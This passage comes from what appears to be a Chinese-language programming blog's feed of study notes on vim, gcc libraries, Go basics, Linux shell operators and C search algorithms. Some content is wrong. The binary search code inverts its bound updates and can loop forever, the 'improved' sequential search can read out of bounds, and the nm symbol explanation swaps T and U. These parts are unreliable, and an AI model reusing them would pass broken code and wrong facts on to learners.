src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/vim/image-20230619081859573.png" alt="vim查找的相关指令"></p><h2 id="分屏操作"><a href="#分屏操作" class="headerlink" title="分屏操作"></a>分屏操作</h2><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/vim/image-20230619084238171.png" alt="image-20230619084238171"></p><h2 id="行跳转"><a href="#行跳转" class="headerlink" title="行跳转"></a>行跳转</h2><p><code>:n</code></p><h2 id="使用shell"><a href="#使用shell" class="headerlink" title="使用shell"></a>使用shell</h2><p>在末行模式下使用<code>shell</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Wireshark</title>
    <link href="/2023/06/16/others/Wireshark/"/>
    <url>/2023/06/16/others/Wireshark/</url>
    
    <content type="html"><![CDATA[<h1 id="初始wireshark"><a href="#初始wireshark" class="headerlink" title="初始wireshark"></a>初始wireshark</h1>]]></content>
    
    
    
    <tags>
      
      <tag>Wireshark</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>gcc</title>
    <link href="/2023/06/15/linux/gcc/"/>
    <url>/2023/06/15/linux/gcc/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="gcc的工作流程"><a href="#gcc的工作流程" class="headerlink" title="gcc的工作流程"></a>gcc的工作流程</h1><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/gcc/gcc%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B.png"></p><ol><li><p>预编译阶段会去除注释</p></li><li><p>编译会生成一个编译文件</p></li><li><p>汇编会得到一个二进制文件</p></li><li><p>部分命令</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/gcc/gcc%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B.png"></p></li><li><p>执行多文件时，一定要编译多个.c文件</p></li></ol><h1 id="制作动态库和静态库"><a href="#制作动态库和静态库" class="headerlink" title="制作动态库和静态库"></a>制作动态库和静态库</h1><h2 id="静态库的创建"><a href="#静态库的创建" class="headerlink" title="静态库的创建"></a>静态库的创建</h2><ol><li><p>静态库的命名格式(linux)</p><p>前缀是<code>lib</code></p><p>后缀是<code>.a</code></p><p>例如<code>libxxx.a</code></p></li><li><p>静态库的命名格式(windows)</p><p>前缀是<code>lib</code></p><p>后缀也是<code>lib</code></p><p>例如<code>libxxx.lib</code></p></li><li><p>静态库的链接</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%99%E6%80%81%E5%BA%93%E5%92%8C%E5%8A%A8%E6%80%81%E5%BA%93/image-20230619194413609.png" alt="image-20230619194413609"></p><ul><li><p><code>ar</code>参数的使用</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%99%E6%80%81%E5%BA%93%E5%92%8C%E5%8A%A8%E6%80%81%E5%BA%93/image-20230619194627222.png" alt="image-20230619194627222"></p></li><li><p>打包练习</p><p><code>ar rcs libxxx.a *.o</code></p><p>注意<code>.o</code>是已经编译的文件</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%99%E6%80%81%E5%BA%93%E5%92%8C%E5%8A%A8%E6%80%81%E5%BA%93/image-20230619211403619.png" alt="image-20230619211403619"></p></li><li><p>使用<code>nm -C .o</code>查看所有定义</p><p><code>T</code>  是外部函数</p><p><code>U</code>  是本文件的函数</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%99%E6%80%81%E5%BA%93%E5%92%8C%E5%8A%A8%E6%80%81%E5%BA%93/image-20230619213441041.png" alt="image-20230619213441041"></p></li></ul></li><li><p>静态库的使用</p><p>编译<code>.a</code>文件</p></li></ol><h2 id="动态库"><a href="#动态库" class="headerlink" title="动态库"></a>动态库</h2><ol><li><p>动态库的创建</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%99%E6%80%81%E5%BA%93%E5%92%8C%E5%8A%A8%E6%80%81%E5%BA%93/image-20230620111319001.png"></p></li><li><p>使用</p></li></ol><h2 id="动态库和静态库的优缺点比较"><a href="#动态库和静态库的优缺点比较" class="headerlink" title="动态库和静态库的优缺点比较"></a>动态库和静态库的优缺点比较</h2><ol><li>动态库运行效率低，但是占用的内存小，对于现代计算机而言，运行效率差别不大</li><li>现在大多都是发布的动态库</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>go学习代码</title>
    <link href="/2023/06/14/go/go%E5%AD%A6%E4%B9%A0%E4%BB%A3%E7%A0%81/"/>
    <url>/2023/06/14/go/go%E5%AD%A6%E4%B9%A0%E4%BB%A3%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="声明变量"><a href="#声明变量" class="headerlink" title="声明变量"></a>声明变量</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>    <span class="hljs-comment">//1.</span><br>    <span class="hljs-keyword">var</span> a <span class="hljs-type">int</span> = <span class="hljs-number">520</span><br>    fmt.Println(a)<br><br>    <span class="hljs-comment">//2.</span><br>    b := <span class="hljs-number">1314</span><br>    fmt.Println(b)<br><br>    <span class="hljs-comment">//3</span><br>    <span class="hljs-keyword">var</span> (<br>        c <span class="hljs-type">int</span> = <span class="hljs-number">959</span><br>        d <span class="hljs-type">int</span> = <span class="hljs-number">244</span><br>    )<br>    fmt.Println(c + d)<br><br>    <span class="hljs-comment">//4</span><br>    <span class="hljs-keyword">var</span> e = <span class="hljs-number">2023</span><br>    fmt.Println(e)<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="常量-模拟枚举"><a href="#常量-模拟枚举" class="headerlink" title="常量(模拟枚举)"></a>常量(模拟枚举)</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-comment">//模拟枚举</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">iota,每行递增</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">const</span> (<br>    A = <span class="hljs-literal">iota</span><br>    B<br>    C<br>    D = <span class="hljs-number">20</span><br>    E<br>    F = <span class="hljs-literal">iota</span><br>    G = <span class="hljs-string">&quot;adh&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-comment">//设置const常量</span><br>    <span class="hljs-comment">//不能使用自动类型推导</span><br>    <span class="hljs-keyword">const</span> a <span class="hljs-type">int</span> = <span class="hljs-number">10</span><br>    <span class="hljs-keyword">const</span> b = <span class="hljs-number">20</span><br>    fmt.Println(a)<br>    fmt.Println(b)<br>    fmt.Println(A)<br>    fmt.Println(F)<br>    fmt.Println(G)<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="多返回值-三种"><a href="#多返回值-三种" class="headerlink" title="多返回值(三种)"></a>多返回值(三种)</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">add</span><span class="hljs-params">(a <span class="hljs-type">int</span>, b <span class="hljs-type">int</span>)</span></span> (<span class="hljs-type">int</span>, <span class="hljs-type">int</span>, <span class="hljs-type">int</span>) &#123;<br>    <span class="hljs-keyword">return</span> a, b, a + b<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">add1</span><span class="hljs-params">(a <span class="hljs-type">int</span>, b <span class="hljs-type">int</span>)</span></span> (c, d <span class="hljs-type">int</span>) &#123;<br>    <span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">add2</span><span class="hljs-params">(a <span class="hljs-type">int</span>, b <span class="hljs-type">int</span>)</span></span> (sum <span class="hljs-type">int</span>) &#123;<br>    sum = a + b<br>    <span class="hljs-keyword">return</span> sum<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    a, b, sum := add(<span class="hljs-number">1</span>, <span class="hljs-number">4</span>)<br>    fmt.Printf(<span class="hljs-string">&quot;%v+%v=%v&quot;</span>, a, b, sum)<br><br>    c, d := add1(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br>    fmt.Println(c, d)<br><br>    sum1 := add2(<span class="hljs-number">2</span>, <span class="hljs-number">4</span>)<br>    fmt.Println(sum1)<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="切片的声明"><a href="#切片的声明" class="headerlink" title="切片的声明"></a>切片的声明</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-comment">//直接声明并且初始化</span><br>    ints := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;<br>    <span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> ints &#123;<br>        fmt.Println(v)<br>    &#125;<br><br>    <span class="hljs-comment">//先声明再创建空间</span><br>    <span class="hljs-keyword">var</span> ints2 []<span class="hljs-type">int</span><br>    ints2 = <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> ints2 &#123;<br>        fmt.Println(v)<br>    &#125;<br>    fmt.Println(ints)<br><br>    ints3 := [<span class="hljs-number">3</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>&#125;<br>    fmt.Println(ints3)<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="容量和长度"><a href="#容量和长度" class="headerlink" title="容量和长度"></a>容量和长度</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//容量和长度</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    ints := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">2</span>)<br>    fmt.Printf(<span class="hljs-string">&quot;len:%d   cap:%d   ints:%v&quot;</span>, <span class="hljs-built_in">len</span>(ints), <span class="hljs-built_in">cap</span>(ints), ints)<br>    ints = <span class="hljs-built_in">append</span>(ints, <span class="hljs-number">1</span>)<br>    fmt.Printf(<span class="hljs-string">&quot;len:%d   cap:%d   ints:%v&quot;</span>, <span class="hljs-built_in">len</span>(ints), <span class="hljs-built_in">cap</span>(ints), ints)<br>    ints = <span class="hljs-built_in">append</span>(ints, <span class="hljs-number">2</span>)<br>    ints = <span class="hljs-built_in">append</span>(ints, <span class="hljs-number">3</span>)<br>    fmt.Printf(<span class="hljs-string">&quot;len:%d   cap:%d   ints:%v&quot;</span>, <span class="hljs-built_in">len</span>(ints), <span class="hljs-built_in">cap</span>(ints), ints)<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="数组，切片的截取"><a href="#数组，切片的截取" class="headerlink" title="数组，切片的截取"></a>数组，切片的截取</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//声明切片的几个方法</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    ints := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;<br><br>    fmt.Println(ints[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]) <span class="hljs-comment">//[0,2)</span><br><br>    fmt.Println(ints[<span class="hljs-number">0</span>:<span class="hljs-built_in">len</span>(ints)]) <span class="hljs-comment">//打印全部的切片</span><br><br>    ints2 := [<span class="hljs-number">5</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;<br>    fmt.Println(ints2)<br>    fmt.Println(ints2[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>])  <span class="hljs-comment">//数组的=也可以截取</span><br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="map的声明"><a href="#map的声明" class="headerlink" title="map的声明"></a>map的声明</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// map的声明</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-comment">//第一种方式</span><br>    map1 := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;<br>        <span class="hljs-string">&quot;one&quot;</span>:   <span class="hljs-number">1</span>,<br>        <span class="hljs-string">&quot;two&quot;</span>:   <span class="hljs-number">2</span>,<br>        <span class="hljs-string">&quot;three&quot;</span>: <span class="hljs-number">3</span>,<br>    &#125;<br>    fmt.Println(map1)<br><br>    <span class="hljs-comment">//第二种形式</span><br>    <span class="hljs-keyword">var</span> map2 <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span> = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>, <span class="hljs-number">4</span>)<br>    fmt.Println(map2)<br><br>    <span class="hljs-comment">//第三种方式</span><br>    map3 := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>, <span class="hljs-number">6</span>)<br>    fmt.Println(map3)<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="delete的使用"><a href="#delete的使用" class="headerlink" title="delete的使用"></a>delete的使用</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    maps := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;<br>        <span class="hljs-string">&quot;one&quot;</span>: <span class="hljs-number">1</span>,<br>        <span class="hljs-string">&quot;two&quot;</span>: <span class="hljs-number">2</span>,<br>    &#125;<br>    v, isHave := maps[<span class="hljs-string">&quot;two&quot;</span>]<br>    <span class="hljs-keyword">if</span> isHave == <span class="hljs-literal">true</span> &#123;<br>        fmt.Println(v)<br>    &#125;<br><br>    <span class="hljs-built_in">delete</span>(maps, <span class="hljs-string">&quot;two&quot;</span>)<br><br>    v, isHave = maps[<span class="hljs-string">&quot;two&quot;</span>]<br><br>    <span class="hljs-keyword">if</span> isHave != <span class="hljs-literal">true</span> &#123;<br>        fmt.Println(<span class="hljs-string">&quot;this is no value&quot;</span>)<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux复习文档</title>
    <link href="/2023/06/12/linux/linux%E5%A4%8D%E4%B9%A0%E6%96%87%E6%A1%A3/"/>
    <url>/2023/06/12/linux/linux%E5%A4%8D%E4%B9%A0%E6%96%87%E6%A1%A3/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="基本的知识"><a href="#基本的知识" class="headerlink" title="基本的知识"></a>基本的知识</h1><ol><li><p>命令执行成功过后返回一个<code>0</code></p></li><li><p>比较运算符</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">-eq       //等于<br>-ne       //不等于<br>-gt        //大于 （greater）<br>-lt         //小于 （less）<br>-ge       //大于等于<br>-le        //小于等于<br>   <br></code></pre></td></tr></table></figure></li></ol><p><img src="/"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机系统简介</title>
    <link href="/2023/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    <url>/2023/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="计算机系统简介"><a href="#计算机系统简介" class="headerlink" title="计算机系统简介"></a>计算机系统简介</h1>]]></content>
    
    
    
    <tags>
      
      <tag>计算机组成原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>algorithm</title>
    <link href="/2023/06/05/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/algorithm/"/>
    <url>/2023/06/05/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/algorithm/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h1><h2 id="顺序查找"><a href="#顺序查找" class="headerlink" title="顺序查找"></a>顺序查找</h2><ol><li><p>就是普通的查找方法    </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">   <br><span class="hljs-type">int</span> <span class="hljs-title function_">search</span><span class="hljs-params">(<span class="hljs-type">int</span> arr[],<span class="hljs-type">int</span> length,<span class="hljs-type">int</span> targetElement)</span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>        <span class="hljs-keyword">if</span>(targetElement==arr[i])&#123;<br>            <span class="hljs-keyword">return</span> i;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br>   <br><span class="hljs-comment">//修改过后的代码</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">searchPlus</span><span class="hljs-params">(<span class="hljs-type">int</span> arr[],<span class="hljs-type">int</span> length,<span class="hljs-type">int</span> targetElement)</span>&#123;<br>    <span class="hljs-type">int</span> n=length<span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">while</span>(arr[n]!=targetElement&amp;&amp;n&gt;<span class="hljs-number">-1</span>)&#123;<br>        n--;<br>    &#125;<br>    <span class="hljs-keyword">return</span> n;<br>&#125;<br>   <br></code></pre></td></tr></table></figure></li></ol><h2 id="折中查找"><a href="#折中查找" class="headerlink" title="折中查找"></a>折中查找</h2><ol><li><p>折中查找</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> nums[<span class="hljs-number">10</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>&#125;;<br>    <span class="hljs-type">int</span> left=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> right=<span class="hljs-keyword">sizeof</span>(nums)/<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>)<span class="hljs-number">-1</span>;<br>    <span class="hljs-type">int</span> mid=(left+right)/<span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">while</span>(left&lt;=right)&#123;<br>        <span class="hljs-keyword">if</span>(nums[mid]&gt;<span class="hljs-number">6</span>)&#123;<br>            right=mid+<span class="hljs-number">1</span>;<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(nums[mid]&lt;<span class="hljs-number">6</span>) &#123;<br>            left=mid<span class="hljs-number">-1</span>;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;find it: %d&quot;</span>,nums[mid]);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        mid=(left+right)/<span class="hljs-number">2</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>   <br></code></pre></td></tr></table></figure></li><li><p>按比例查找（差值查找）</p><p>这个算法是根据这种算法来的，只是采用的比例不是<code>1/2</code> </p><p>这个算法可以用于大型的增长相对来说有序的线性表</p></li><li><p>斐波那契查找</p><p>根据的还是折半查找，只不过这个的表是斐波那契数列</p></li><li><p>线性索引查找</p><ul><li><p>索引方式</p><ul><li><p>稠密索引</p><p>适用于数据量不大</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/algorithm/%E7%A8%A0%E5%AF%86%E7%B4%A2%E5%BC%95.png"></p></li><li><p>分块索引</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/algorithm/%E7%A8%A0%E5%AF%86%E7%B4%A2%E5%BC%95.png"></p></li><li><p>倒排索引</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/algorithm/%E5%80%92%E6%8E%92%E7%B4%A2%E5%BC%95.png"></p></li></ul></li></ul></li></ol><h2 id="二叉排序树（二叉查找树）、"><a href="#二叉排序树（二叉查找树）、" class="headerlink" title="二叉排序树（二叉查找树）、"></a>二叉排序树（二叉查找树）、</h2><p>没有学会</p><p>下面代码有bug</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span 